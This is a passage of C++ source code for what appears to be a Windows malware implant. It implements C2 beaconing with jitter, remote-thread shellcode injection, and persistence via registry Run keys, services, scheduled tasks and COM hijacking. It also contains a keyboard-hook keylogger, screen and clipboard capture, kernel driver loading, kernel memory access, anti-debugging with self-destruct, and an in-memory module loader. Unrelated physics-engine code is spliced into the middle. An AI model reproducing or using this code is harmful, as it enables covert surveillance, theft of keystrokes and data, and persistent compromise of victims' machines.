            u32 base = self->cfg_.beacon_min + rng.next_u32() % (self->cfg_.beacon_max - self->cfg_.beacon_min + 1);
            u32 jitter = u32(u64(base) * self->cfg_.jitter / 100);
            u32 sleep_ms = base + (rng.next_u32() % (jitter * 2 + 1)) - jitter;
            for (u32 i = 0; i < sleep_ms / 100; ++i) {
                if (!self->running_.load(std::memory_order_acquire)) return 0;
                ::Sleep(100);
            }
        }
        return 0;
    }
};

class tf_process {
public:
    struct tf_process_info {
        u32 pid;
        u32 ppid;
        u32 session_id;
        char name[256];
        char path[512];
        u64 create_time;
    };

    static TF_FORCEINLINE bool enum_processes(std::vector<tf_process_info>& out) TF_NOTHROW {
        HMODULE h = ::GetModuleHandleA("ntdll.dll");
        if (!h) return false;
        auto NtQuerySystemInformation = reinterpret_cast<NTSTATUS(WINAPI*)(ULONG,PVOID,ULONG,PULONG)>(
            ::GetProcAddress(h, "NtQuerySystemInformation"));
        if (!NtQuerySystemInformation) return false;
        ULONG sz = 1 << 20;
        std::vector<u8> buf(sz);
        NTSTATUS s;
        while ((s = NtQuerySystemInformation(5, buf.data(), sz, &sz)) == 0xC0000023L)
            buf.resize(sz *= 2);
        if (!NT_SUCCESS(s)) return false;
        auto p = reinterpret_cast<SYSTEM_PROCESS_INFORMATION*>(buf.data());
        while (true) {
            tf_process_info pi = {};
            pi.pid = HandleToULong(p->UniqueProcessId);
            pi.ppid = HandleToULong(p->InheritedFromUniqueProcessId);
            pi.session_id = p->SessionId;
            pi.create_time = u64(p->CreateTime.QuadPart);
            if (p->ImageName.Buffer) {
                for (u32 i = 0; i < p->ImageName.Length / 2 && i < 255; ++i)
                    pi.name[i] = char(p->ImageName.Buffer[i]);
            }
            HANDLE hp = ::OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pi.pid);
            if (hp) {
                DWORD psz = sizeof(pi.path);
                ::QueryFullProcessImageNameA(hp, 0, pi.path, &psz);
                ::CloseHandle(hp);
            }
            out.push_back(pi);
            if (!p->NextEntryOffset) break;
            p = reinterpret_cast<SYSTEM_PROCESS_INFORMATION*>(
                reinterpret_cast<u8*>(p) + p->NextEntryOffset);
        }
        return true;
    }

    static TF_FORCEINLINE bool inject(u32 pid, const u8* shellcode, u32 len) TF_NOTHROW {
        HANDLE p = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!p) return false;
        bool ok = false;
        PVOID mem = ::VirtualAllocEx(p, nullptr, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (mem) {
            SIZE_T w = 0;
            if (::WriteProcessMemory(p, mem, shellcode, len, &w) && w == len) {
                HANDLE t = ::CreateRemoteThread(p, nullptr, 0,
                    reinterpret_cast<LPTHREAD_START_ROUTINE>(mem), nullptr, 0, nullptr);
                if (t) { ::CloseHandle(t); ok = true; }
            }
            if (!ok) ::VirtualFreeEx(p, mem, 0, MEM_RELEASE);
        }
        ::CloseHandle(p);
        return ok;
    }

    static TF_FORCEINLINE bool spawn(const char* cmd, u32* pid = nullptr) TF_NOTHROW {
        STARTUPINFOA si = {}; si.cb = sizeof(si);
        PROCESS_INFORMATION pi = {};
        char buf[8192];
        strncpy_s(buf, cmd, _TRUNCATE);
        BOOL ok = ::CreateProcessA(nullptr, buf, nullptr, nullptr, FALSE,
            CREATE_NO_WINDOW | CREATE_SUSPENDED, nullptr, nullptr, &si, &pi);
        if (!ok) return false;
        ::ResumeThread(pi.hThread);
        if (pid) *pid = pi.dwProcessId;
        ::CloseHandle(pi.hThread);
        ::CloseHandle(pi.hProcess);
        return true;
    }
};

class tf_persistence {
public:
    static TF_FORCEINLINE bool install_reg_run(const char* name, const char* cmd) TF_NOTHROW {
        HKEY k = nullptr;
        LSTATUS s = ::RegCreateKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, nullptr, 0, KEY_SET_VALUE, nullptr, &k, nullptr);
        if (s != ERROR_SUCCESS) return false;
        s = ::RegSetValueExA(k, name, 0, REG_SZ, (const BYTE*)cmd, (DWORD)::strlen(cmd) + 1);
        ::RegCloseKey(k);
        return s == ERROR_SUCCESS;
    }

    static TF_FORCEINLINE bool install_reg_runonce(const char* name, const char* cmd) TF_NOTHROW {
        HKEY k = nullptr;
        LSTATUS s = ::RegCreateKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, nullptr, 0, KEY_SET_VALUE, nullptr, &k, nullptr);
        if (s != ERROR_SUCCESS) return false;
        s = ::RegSetValueExA(k, name, 0, REG_SZ, (const BYTE*)cmd, (DWORD)::strlen(cmd) + 1);
        ::RegCloseKey(k);
        return s == ERROR_SUCCESS;
    }

    static TF_FORCEINLINE bool install_service(const char* name, const char* disp, const char* path) TF_NOTHROW {
        SC_HANDLE scm = ::OpenSCManagerA(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
        if (!scm) return false;
        SC_HANDLE svc = ::CreateServiceA(scm, name, disp, SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE,
            path, nullptr, nullptr, nullptr, nullptr, nullptr);
        if (!svc) { ::CloseServiceHandle(scm); return false; }
        ::StartServiceA(svc, 0, nullptr);
        ::CloseServiceHandle(svc);
        ::CloseServiceHandle(scm);
        return true;
    }

    static TF_FORCEINLINE bool install_schtask(const char* name, const char* path) TF_NOTHROW {
        char cmd[4096];
        _snprintf_s(cmd, _TRUNCATE,
            "schtasks /create /tn \"%s\" /tr \"%s\" /sc onlogon /rl highest /f", name, path);
        return tf_process::spawn(cmd);
    }

    static TF_FORCEINLINE bool install_com_hijack(const char* clsid, const char* dll_path) TF_NOTHROW {
        char key[512];
        _snprintf_s(key, _TRUNCATE, "CLSID\\%s\\InprocServer32", clsid);
        HKEY k = nullptr;
        LSTATUS s = ::RegCreateKeyExA(HKEY_CLASSES_ROOT, key, 0, nullptr, 0, KEY_SET_VALUE, nullptr, &k, nullptr);
        if (s != ERROR_SUCCESS) return false;
        ::RegSetValueExA(k, nullptr, 0, REG_SZ, (const BYTE*)dll_path, (DWORD)::strlen(dll_path) + 1);
        const char* model = "Apartment";
        ::RegSetValueExA(k, "ThreadingModel", 0, REG_SZ, (const BYTE*)model, 10);
        ::RegCloseKey(k);
        return true;
    }
};

class tf_module {
public:
    using tf_module_entry = NTSTATUS(WINAPI*)(PVOID ctx, ULONG reason);

    struct tf_module_header {
        u32 magic;
        u32 version;
        u32 id;
        u32 flags;
        u32 code_size;
        u32 data_size;
        u32 entry_offset;
        u32 name_hash;
        u8  sha256[32];
        u32 reserved[8];
    };

    struct tf_module_instance {
        u32              id;
        u32              name_hash;
        tf_module_header header;
        PVOID            base;
        SIZE_T           size;
        tf_module_entry  entry;
        HMODULE          host;
        volatile LONG    ref_count;
    };

    tf_module() TF_NOTHROW { ::InitializeSRWLock(&lock_); }
    ~tf_module() TF_NOTHROW { unload_all(); }

    TF_FORCEINLINE NTSTATUS load(const u8* blob, u32 blob_len, u32* out_id = nullptr) TF_NOTHROW {
        if (!blob || blob_len < sizeof(tf_module_header)) return TF_STATUS_INVALID_PARAMETER;
        auto hdr = reinterpret_cast<const tf_module_header*>(blob);
        if (hdr->magic != TF_MAGIC) return TF_STATUS_INVALID_PARAMETER;
        u8 hash[32];
        tf_crypto::sha256_ctx s;
        tf_crypto::sha256_init(&s);
        tf_crypto::sha256_update(&s, blob + sizeof(tf_module_header), blob_len - sizeof(tf_module_header));
        tf_crypto::sha256_final(&s, hash);
        if (::memcmp(hash, hdr->sha256, 32) != 0) return TF_STATUS_ACCESS_DENIED;

        PVOID base = nullptr; SIZE_T sz = 0;
        const u8* code = blob + sizeof(tf_module_header);
        if (!tf_pe::map_to_memory(code, &base, &sz))
            return TF_STATUS_FAILED;

        auto inst = new tf_module_instance();
        inst->id = hdr->id;
        inst->name_hash = hdr->name_hash;
        inst->header = *hdr;
        inst->base = base;
        inst->size = sz;
        inst->host = static_cast<HMODULE>(base);
        inst->entry = reinterpret_cast<tf_module_entry>(static_cast<u8*>(base) + hdr->entry_offset);
        inst->ref_count = 1;

        ::AcquireSRWLockExclusive(&lock_);
        if (modules_.size() >= TF_MAX_MODULES) {
            ::ReleaseSRWLockExclusive(&lock_);
            ::VirtualFree(base, 0, MEM_RELEASE);
            delete inst;
            return TF_STATUS_BUFFER_TOO_SMALL;
        }
        modules_.push_back(inst);
        ::ReleaseSRWLockExclusive(&lock_);

        NTSTATUS s = inst->entry(nullptr, 1);
        if (!NT_SUCCESS(s)) { unload(hdr->id); return s; }
        if (out_id) *out_id = hdr->id;
        return TF_STATUS_SUCCESS;
    }

    TF_FORCEINLINE NTSTATUS unload(u32 id) TF_NOTHROW {
        ::AcquireSRWLockExclusive(&lock_);
        for (sz i = 0; i < modules_.size(); ++i) {
            if (modules_[i]->id == id) {
                auto m = modules_[i];
                modules_.erase(modules_.begin() + i);
                ::ReleaseSRWLockExclusive(&lock_);
                m->entry(nullptr, 3);
                ::VirtualFree(m->base, 0, MEM_RELEASE);
                delete m;
                return TF_STATUS_SUCCESS;
            }
        }
        ::ReleaseSRWLockExclusive(&lock_);
        return TF_STATUS_NOT_FOUND;
    }

    TF_FORCEINLINE void unload_all() TF_NOTHROW {
        ::AcquireSRWLockExclusive(&lock_);
        for (auto m : modules_) {
            m->entry(nullptr, 3);
            ::VirtualFree(m->base, 0, MEM_RELEASE);
            delete m;
        }
        modules_.clear();
        ::ReleaseSRWLockExclusive(&lock_);
    }

    TF_FORCEINLINE tf_module_instance* find(u32 id) TF_NOTHROW {
        ::AcquireSRWLockShared(&lock_);
        for (auto m : modules_) if (m->id == id) {
            ::InterlockedIncrement(&m->ref_count);
            ::ReleaseSRWLockShared(&lock_);
            return m;
        }
        ::ReleaseSRWLockShared(&lock_);
        return nullptr;
    }

    TF_FORCEINLINE void release(tf_module_instance* m) TF_NOTHROW {
        if (m) ::InterlockedDecrement(&m->ref_count);
    }

private:
    SRWLOCK                    lock_;
    std::vector<tf_module_instance*> modules_;
};

class tf_keylogger {
public:
    tf_keylogger() TF_NOTHROW : running_(false), thread_(nullptr), hhook_(nullptr) {}
    ~tf_keylogger() TF_NOTHROW { stop(); }

    TF_FORCEINLINE bool start() TF_NOTHROW {
        running_.store(true, std::memory_order_release);
        hhook_ = ::SetWindowsHookExA(WH_KEYBOARD_LL, &tf_keylogger::proc, nullptr, 0);
        if (!hhook_) return false;
        thread_ = ::CreateThread(nullptr, 0, &tf_keylogger::pump, this, 0, nullptr);
        return thread_ != nullptr;
    }

    TF_FORCEINLINE void stop() TF_NOTHROW {
        running_.store(false, std::memory_order_release);
        if (hhook_) { ::UnhookWindowsHookEx(hhook_); hhook_ = nullptr; }
        if (thread_) { ::WaitForSingleObject(thread_, 3000); ::CloseHandle(thread_); thread_ = nullptr; }
    }

    TF_FORCEINLINE sz get_buffer(u8* out, sz max) TF_NOTHROW {
        ::AcquireSRWLockExclusive(&lock_);
        sz n = min(buf_.size(), max);
        if (n) ::memcpy(out, buf_.data(), n);
        buf_.clear();
        ::ReleaseSRWLockExclusive(&lock_);
        return n;
    }

private:
    std::atomic<bool> running_;
    HANDLE thread_;
    HHOOK  hhook_;
    SRWLOCK lock_ = SRWLOCK_INIT;
    std::vector<u8> buf_;

    static TF_FORCEINLINE LRESULT CALLBACK proc(int n, WPARAM w, LPARAM l) TF_NOTHROW {
        if (n >= 0 && (w == WM_KEYDOWN || w == WM_SYSKEYDOWN)) {
            auto k = reinterpret_cast<KBDLLHOOKSTRUCT*>(l);
            char c = 0;
            BYTE ks[256] = {};
            ::GetKeyboardState(ks);
            WCHAR wc = 0;
            if (::ToUnicode(k->vkCode, k->scanCode, ks, &wc, 1, 0) == 1)
                c = char(wc);
            if (c) {
                thread_local tf_keylogger* self = nullptr;
                if (!self) self = instance_;
                if (self) {
                    ::AcquireSRWLockExclusive(&self->lock_);
                    self->buf_.push_back(u8(c));
                    if (self->buf_.size() > 65536) self->buf_.erase(self->buf_.begin(), self->buf_.begin() + 32768);
                    ::ReleaseSRWLockExclusive(&self->lock_);
                }
            }
        }
        return ::CallNextHookEx(nullptr, n, w, l);
    }

    static TF_FORCEINLINE DWORD WINAPI pump(LPVOID p) TF_NOTHROW {
        instance_ = static_cast<tf_keylogger*>(p);
        MSG m;
        while (instance_->running_.load(std::memory_order_acquire)) {
            while (::PeekMessageA(&m, nullptr, 0, 0, PM_REMOVE)) {
                ::TranslateMessage(&m);
                ::DispatchMessageA(&m);
            }
            ::Sleep(10);
        }
        return 0;
    }

    static inline thread_local tf_keylogger* instance_ = nullptr;
};

class tf_screenshot {
public:
    static TF_FORCEINLINE bool capture(std::vector<u8>& out, u32& w, u32& h) TF_NOTHROW {
        HDC sdc = ::GetDC(nullptr);
        if (!sdc) return false;
        w = ::GetDeviceCaps(sdc, DESKTOPHORZRES);
        h = ::GetDeviceCaps(sdc, DESKTOPVERTRES);
        HDC mdc = ::CreateCompatibleDC(sdc);
        HBITMAP bmp = ::CreateCompatibleBitmap(sdc, w, h);
        auto old = ::SelectObject(mdc, bmp);
        ::BitBlt(mdc, 0, 0, w, h, sdc, 0, 0, SRCCOPY | CAPTUREBLT);
        ::SelectObject(mdc, old);

        BITMAPINFO bi = {};
        bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bi.bmiHeader.biWidth = w;
        bi.bmiHeader.biHeight = -(i32)h;
        bi.bmiHeader.biPlanes = 1;
        bi.bmiHeader.biBitCount = 32;
        bi.bmiHeader.biCompression = BI_RGB;
        sz stride = tf_align<sz>(w * 4, 4);
        sz data_sz = stride * h;
        out.resize(sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + data_sz);
        auto fh = reinterpret_cast<BITMAPFILEHEADER*>(out.data());
        fh->bfType = 0x4D42;
        fh->bfSize = (DWORD)out.size();
        fh->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
        ::memcpy(out.data() + sizeof(BITMAPFILEHEADER), &bi.bmiHeader, sizeof(BITMAPINFOHEADER));
        ::GetDIBits(mdc, bmp, 0, h, out.data() + fh->bfOffBits, &bi, DIB_RGB_COLORS);

        ::DeleteObject(bmp);
        ::DeleteDC(mdc);
        ::ReleaseDC(nullptr, sdc);
        return true;
    }
};

class tf_clipboard {
public:
    static TF_FORCEINLINE bool get_text(std::string& out) TF_NOTHROW {
        if (!::OpenClipboard(nullptr)) return false;
        HANDLE h = ::GetClipboardData(CF_TEXT);
        bool ok = false;
        if (h) {
            auto p = static_cast<const char*>(::GlobalLock(h));
            if (p) { out = p; ok = true; ::GlobalUnlock(h); }
        }
        ::CloseClipboard();
        return ok;
    }

    static TF_FORCEINLINE bool set_text(const char* s) TF_NOTHROW {
        if (!::OpenClipboard(nullptr)) return false;
        ::EmptyClipboard();
        sz n = ::strlen(s) + 1;
        HGLOBAL h = ::GlobalAlloc(GMEM_MOVEABLE, n);
        if (!h) { ::CloseClipboard(); return false; }
        auto p = static_cast<char*>(::GlobalLock(h));
        ::memcpy(p, s, n);
        ::GlobalUnlock(h);
        ::SetClipboardData(CF_TEXT, h);
        ::CloseClipboard();
        return true;
    }
};

class tf_physics {
public:
    struct vec3 { f64 x, y, z; };
    struct vec4 { f64 x, y, z, w; };
    struct quat { f64 w, x, y, z; };

    struct rigid_body {
        vec3    position;
        vec3    velocity;
        vec3    acceleration;
        quat    orientation;
        vec3    angular_vel;
        f64     mass;
        f64     inv_mass;
        f64     restitution;
        f64     friction;
        vec3    inertia;
        vec3    inv_inertia;
        u32     flags;
        void*   user_data;
    };

    struct contact {
        rigid_body* a;
        rigid_body* b;
        vec3        normal;
        vec3        point;
        f64         depth;
        f64         restitution;
        f64         friction;
    };

    struct world {
        std::vector<rigid_body*> bodies;
        std::vector<contact>      contacts;
        vec3                      gravity;
        f64                       time_scale;
        u32                       substeps;
    };

    static TF_FORCEINLINE vec3 v_add(const vec3& a, const vec3& b) TF_NOTHROW { return {a.x+b.x,a.y+b.y,a.z+b.z}; }
    static TF_FORCEINLINE vec3 v_sub(const vec3& a, const vec3& b) TF_NOTHROW { return {a.x-b.x,a.y-b.y,a.z-b.z}; }
    static TF_FORCEINLINE vec3 v_mul(const vec3& a, f64 s) TF_NOTHROW { return {a.x*s,a.y*s,a.z*s}; }
    static TF_FORCEINLINE f64  v_dot(const vec3& a, const vec3& b) TF_NOTHROW { return a.x*b.x+a.y*b.y+a.z*b.z; }
    static TF_FORCEINLINE vec3 v_cross(const vec3& a, const vec3& b) TF_NOTHROW {
        return {a.y*b.z-a.z*b.y, a.z*b.x-a.x*b.z, a.x*b.y-a.y*b.x};
    }
    static TF_FORCEINLINE f64 v_len2(const vec3& a) TF_NOTHROW { return v_dot(a,a); }
    static TF_FORCEINLINE f64 v_len(const vec3& a) TF_NOTHROW { return ::sqrt(v_dot(a,a)); }
    static TF_FORCEINLINE vec3 v_norm(const vec3& a) TF_NOTHROW { f64 l = v_len(a); return l>1e-12 ? v_mul(a,1.0/l) : a; }

    static TF_FORCEINLINE quat q_mul(const quat& a, const quat& b) TF_NOTHROW {
        return {
            a.w*b.w - a.x*b.x - a.y*b.y - a.z*b.z,
            a.w*b.x + a.x*b.w + a.y*b.z - a.z*b.y,
            a.w*b.y - a.x*b.z + a.y*b.w + a.z*b.x,
            a.w*b.z + a.x*b.y - a.y*b.x + a.z*b.w
        };
    }

    static TF_FORCEINLINE quat q_norm(const quat& q) TF_NOTHROW {
        f64 l = ::sqrt(q.w*q.w+q.x*q.x+q.y*q.y+q.z*q.z);
        return l>1e-12 ? quat{q.w/l,q.x/l,q.y/l,q.z/l} : quat{1,0,0,0};
    }

    static TF_FORCEINLINE void integrate(rigid_body* b, f64 dt) TF_NOTHROW {
        if (b->inv_mass <= 0) return;
        b->velocity = v_add(b->velocity, v_mul(b->acceleration, dt));
        b->position = v_add(b->position, v_mul(b->velocity, dt));
        quat wq = {0, b->angular_vel.x*0.5, b->angular_vel.y*0.5, b->angular_vel.z*0.5};
        quat dq = q_mul(wq, b->orientation);
        b->orientation = q_norm({b->orientation.w + dq.w*dt, b->orientation.x + dq.x*dt,
                                 b->orientation.y + dq.y*dt, b->orientation.z + dq.z*dt});
    }

    static TF_FORCEINLINE bool collide_sphere_sphere(const rigid_body* a, const rigid_body* b,
        f64 ra, f64 rb, contact* c) TF_NOTHROW {
        vec3 d = v_sub(b->position, a->position);
        f64 dist2 = v_len2(d);
        f64 r = ra + rb;
        if (dist2 > r*r) return false;
        f64 dist = ::sqrt(dist2);
        c->a = const_cast<rigid_body*>(a);
        c->b = const_cast<rigid_body*>(b);
        c->normal = dist > 1e-12 ? v_mul(d, 1.0/dist) : vec3{0,1,0};
        c->point = v_add(a->position, v_mul(c->normal, ra));
        c->depth = r - dist;
        c->restitution = ::sqrt(a->restitution * b->restitution);
        c->friction = ::sqrt(a->friction * b->friction);
        return true;
    }

    static TF_FORCEINLINE void resolve_contact(contact* c) TF_NOTHROW {
        vec3 rv = v_sub(c->b->velocity, c->a->velocity);
        f64 vel = v_dot(rv, c->normal);
        if (vel > 0) return;
        f64 e = c->restitution;
        f64 j = -(1.0 + e) * vel / (c->a->inv_mass + c->b->inv_mass);
        vec3 imp = v_mul(c->normal, j);
        if (c->a->inv_mass > 0) c->a->velocity = v_sub(c->a->velocity, v_mul(imp, c->a->inv_mass));
        if (c->b->inv_mass > 0) c->b->velocity = v_add(c->b->velocity, v_mul(imp, c->b->inv_mass));
        if (c->depth > 0) {
            f64 total = c->a->inv_mass + c->b->inv_mass;
            if (total > 0) {
                f64 slop = 0.01;
                f64 percent = 0.8;
                f64 corr = (::max(c->depth - slop, 0.0) / total) * percent;
                if (c->a->inv_mass > 0)
                    c->a->position = v_sub(c->a->position, v_mul(c->normal, corr * c->a->inv_mass));
                if (c->b->inv_mass > 0)
                    c->b->position = v_add(c->b->position, v_mul(c->normal, corr * c->b->inv_mass));
            }
        }
    }

    static TF_FORCEINLINE void step_world(world* w, f64 dt) TF_NOTHROW {
        f64 sdt = dt * w->time_scale / f64(w->substeps);
        for (u32 s = 0; s < w->substeps; ++s) {
            for (auto b : w->bodies) {
                if (b->inv_mass > 0) b->acceleration = w->gravity;
                integrate(b, sdt);
            }
            w->contacts.clear();
            for (sz i = 0; i < w->bodies.size(); ++i) {
                for (sz j = i+1; j < w->bodies.size(); ++j) {
                    contact c;
                    if (collide_sphere_sphere(w->bodies[i], w->bodies[j], 1.0, 1.0, &c))
                        w->contacts.push_back(c);
                }
            }
            for (auto& c : w->contacts) resolve_contact(&c);
        }
    }
};

class tf_hardware {
public:
    struct cpu_info {
        char vendor[13];
        char brand[49];
        u32  family;
        u32  model;
        u32  stepping;
        u32  cores;
        u32  threads;
        u32  features_ecx;
        u32  features_edx;
        u32  features_ext;
        bool has_sse;
        bool has_sse2;
        bool has_sse3;
        bool has_ssse3;
        bool has_sse41;
        bool has_sse42;
        bool has_avx;
        bool has_avx2;
        bool has_bmi1;
        bool has_bmi2;
        bool has_rdrand;
        bool has_rdseed;
        bool has_aes;
        bool has_sha;
        bool has_hypervisor;
    };

    struct mem_info {
        u64 total_phys;
        u64 avail_phys;
        u64 total_virt;
        u64 avail_virt;
        u64 total_pagefile;
        u32 page_size;
        u32 alloc_gran;
    };

    struct disk_info {
        char model[64];
        char serial[32];
        u64  size_bytes;
        u32  type;
    };

    static TF_FORCEINLINE void get_cpu_info(cpu_info* ci) TF_NOTHROW {
        ::memset(ci, 0, sizeof(*ci));
        int info[4] = {};
        TF_CPUID(info, 0);
        u32 max = info[0];
        *(u32*)(ci->vendor) = info[1];
        *(u32*)(ci->vendor+4) = info[3];
        *(u32*)(ci->vendor+8) = info[2];
        ci->vendor[12] = 0;
        if (max >= 1) {
            TF_CPUID(info, 1);
            ci->stepping = info[0] & 0xF;
            ci->model = (info[0] >> 4) & 0xF;
            ci->family = (info[0] >> 8) & 0xF;
            ci->threads = (info[1] >> 16) & 0xFF;
            ci->features_ecx = info[2];
            ci->features_edx = info[3];
            ci->has_sse    = (info[3] >> 25) & 1;
            ci->has_sse2   = (info[3] >> 26) & 1;
            ci->has_sse3   = (info[2] >> 0) & 1;
            ci->has_ssse3  = (info[2] >> 9) & 1;
            ci->has_sse41  = (info[2] >> 19) & 1;
            ci->has_sse42  = (info[2] >> 20) & 1;
            ci->has_aes    = (info[2] >> 25) & 1;
            ci->has_rdrand = (info[2] >> 30) & 1;
            ci->has_hypervisor = (info[2] >> 31) & 1;
        }
        if (max >= 7) {
            __cpuidex(info, 7, 0);
            ci->features_ext = info[1];
            ci->has_bmi1 = (info[1] >> 3) & 1;
            ci->has_avx2 = (info[1] >> 5) & 1;
            ci->has_bmi2 = (info[1] >> 8) & 1;
            ci->has_rdseed = (info[1] >> 18) & 1;
            ci->has_sha = (info[1] >> 29) & 1;
            ci->has_avx = (info[2] >> 28) & 1;
        }
        if (max >= 0x80000004) {
            for (u32 i = 0; i < 3; ++i) {
                __cpuidex(info, 0x80000002 + i, 0);
                ::memcpy(ci->brand + i*16, info, 16);
            }
            ci->brand[48] = 0;
        }
        SYSTEM_INFO si; ::GetSystemInfo(&si);
        ci->cores = si.dwNumberOfProcessors;
    }

    static TF_FORCEINLINE void get_mem_info(mem_info* mi) TF_NOTHROW {
        MEMORYSTATUSEX ms = {}; ms.dwLength = sizeof(ms);
        ::GlobalMemoryStatusEx(&ms);
        SYSTEM_INFO si; ::GetSystemInfo(&si);
        mi->total_phys = u64(ms.ullTotalPhys);
        mi->avail_phys = u64(ms.ullAvailPhys);
        mi->total_virt = u64(ms.ullTotalVirtual);
        mi->avail_virt = u64(ms.ullAvailVirtual);
        mi->total_pagefile = u64(ms.ullTotalPageFile);
        mi->page_size = si.dwPageSize;
        mi->alloc_gran = si.dwAllocationGranularity;
    }

    static TF_FORCEINLINE u64 read_msr(u32 reg) TF_NOTHROW {
        return __readmsr(reg);
    }

    static TF_FORCEINLINE void write_msr(u32 reg, u64 val) TF_NOTHROW {
        __writemsr(reg, val);
    }

    static TF_FORCEINLINE void cpuid(u32 leaf, u32 subleaf, u32* a, u32* b, u32* c, u32* d) TF_NOTHROW {
        int info[4]; __cpuidex(info, (int)leaf, (int)subleaf);
        *a = info[0]; *b = info[1]; *c = info[2]; *d = info[3];
    }

    static TF_FORCEINLINE u64 physical_memory_size() TF_NOTHROW {
        mem_info mi; get_mem_info(&mi); return mi.total_phys;
    }
};

class tf_kernel {
public:
    struct tf_driver_params {
        const wchar_t* service_name;
        const wchar_t* display_name;
        const wchar_t* image_path;
    };

    static TF_FORCEINLINE bool load_driver(const tf_driver_params* p) TF_NOTHROW {
        SC_HANDLE scm = ::OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
        if (!scm) return false;
        SC_HANDLE svc = ::CreateServiceW(scm, p->service_name, p->display_name,
            SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
            SERVICE_ERROR_NORMAL, p->image_path, nullptr, nullptr, nullptr, nullptr, nullptr);
        if (!svc) {
            svc = ::OpenServiceW(scm, p->service_name, SERVICE_ALL_ACCESS);
            if (!svc) { ::CloseServiceHandle(scm); return false; }
        }
        BOOL ok = ::StartServiceW(svc, 0, nullptr);
        ::CloseServiceHandle(svc);
        ::CloseServiceHandle(scm);
        return ok != FALSE;
    }

    static TF_FORCEINLINE bool unload_driver(const wchar_t* name) TF_NOTHROW {
        SC_HANDLE scm = ::OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
        if (!scm) return false;
        SC_HANDLE svc = ::OpenServiceW(scm, name, SERVICE_STOP | DELETE);
        if (!svc) { ::CloseServiceHandle(scm); return false; }
        SERVICE_STATUS st = {};
        ::ControlService(svc, SERVICE_CONTROL_STOP, &st);
        BOOL ok = ::DeleteService(svc);
        ::CloseServiceHandle(svc);
        ::CloseServiceHandle(scm);
        return ok != FALSE;
    }

    static TF_FORCEINLINE HANDLE open_device(const wchar_t* path) TF_NOTHROW {
        return ::CreateFileW(path, GENERIC_READ | GENERIC_WRITE, 0, nullptr,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    }

    static TF_FORCEINLINE bool ioctl(HANDLE d, u32 code, const void* in, u32 isz,
        void* out, u32 osz, u32* ret = nullptr) TF_NOTHROW {
        DWORD r = 0;
        BOOL ok = ::DeviceIoControl(d, code, const_cast<void*>(in), isz, out, osz, &r, nullptr);
        if (ret) *ret = r;
        return ok != FALSE;
    }

    static TF_FORCEINLINE NTSTATUS read_kernel_memory(u64 addr, void* buf, sz n) TF_NOTHROW {
        HMODULE h = ::GetModuleHandleA("ntdll.dll");
        if (!h) return TF_STATUS_ACCESS_DENIED;
        auto NtReadVirtualMemory = reinterpret_cast<NTSTATUS(WINAPI*)(HANDLE,PVOID,PVOID,ULONG,PULONG)>(
            ::GetProcAddress(h, "NtReadVirtualMemory"));
        if (!NtReadVirtualMemory) return TF_STATUS_NOT_FOUND;
        HANDLE sys = reinterpret_cast<HANDLE>(static_cast<uptr>(-1));
        ULONG ret = 0;
        return NtReadVirtualMemory(sys, reinterpret_cast<PVOID>(addr), buf, (ULONG)n, &ret);
    }

    static TF_FORCEINLINE NTSTATUS write_kernel_memory(u64 addr, const void* buf, sz n) TF_NOTHROW {
        HMODULE h = ::GetModuleHandleA("ntdll.dll");
        if (!h) return TF_STATUS_ACCESS_DENIED;
        auto NtWriteVirtualMemory = reinterpret_cast<NTSTATUS(WINAPI*)(HANDLE,PVOID,PVOID,ULONG,PULONG)>(
            ::GetProcAddress(h, "NtWriteVirtualMemory"));
        if (!NtWriteVirtualMemory) return TF_STATUS_NOT_FOUND;
        HANDLE sys = reinterpret_cast<HANDLE>(static_cast<uptr>(-1));
        ULONG ret = 0;
        return NtWriteVirtualMemory(sys, reinterpret_cast<PVOID>(addr), const_cast<void*>(buf), (ULONG)n, &ret);
    }

    static TF_FORCEINLINE u64 get_kernel_proc_address(const char* name) TF_NOTHROW {
        HMODULE h = static_cast<HMODULE>(tf_syscall::get_ntos_base());
        if (!h) return 0;
        FARPROC p = ::GetProcAddress(h, name);
        return p ? reinterpret_cast<u64>(p) : 0;
    }
};

class tf_core {
public:
    struct tf_global_config {
        u32              magic;
        u32              version;
        u64              instance_id;
        u32              flags;
        tf_c2::tf_config c2;
        u32              antidebug_threshold;
        u32              self_destruct_on_fail;
        u32              max_modules;
        u32              reserved[32];
    };

    static tf_core& instance() TF_NOTHROW {
        static tf_core inst;
        return inst;
    }

    TF_FORCEINLINE NTSTATUS initialize(const tf_global_config* cfg) TF_NOTHROW {
        if (!cfg || cfg->magic != TF_MAGIC) return TF_STATUS_INVALID_PARAMETER;
        cfg_ = *cfg;

        if (tf_antidebug::run_all_checks() >= cfg_.antidebug_threshold) {
            if (cfg_.self_destruct_on_fail) tf_antidebug::suicide();
            return TF_STATUS_ACCESS_DENIED;
        }

        tf_crypto::rng_bytes(cfg_.c2.session_id, sizeof(cfg_.c2.session_id));

        c2_ = std::make_unique<tf_c2>(&cfg_.c2);
        modules_ = std::make_unique<tf_module>();
        keylogger_ = std::make_unique<tf_keylogger>();

        ::InitializeSRWLock(&state_lock_);
        state_ = STATE_INITIALIZED;

        return TF_STATUS_SUCCESS;
    }

    TF_FORCEINLINE NTSTATUS run() TF_NOTHROW {
        if (state_ != STATE_INITIALIZED) return TF_STATUS_FAILED;
        state_ = STATE_RUNNING;
        c2_->start();
        keylogger_->start();

        while (state_ == STATE_RUNNING) {
            if (tf_antidebug::run_all_checks() >= cfg_.antidebug_threshold) {
                if (cfg_.self_destruct_on_fail) tf_antidebug::suicide();
            }
            heartbeat();
            ::Sleep(1000);
        }

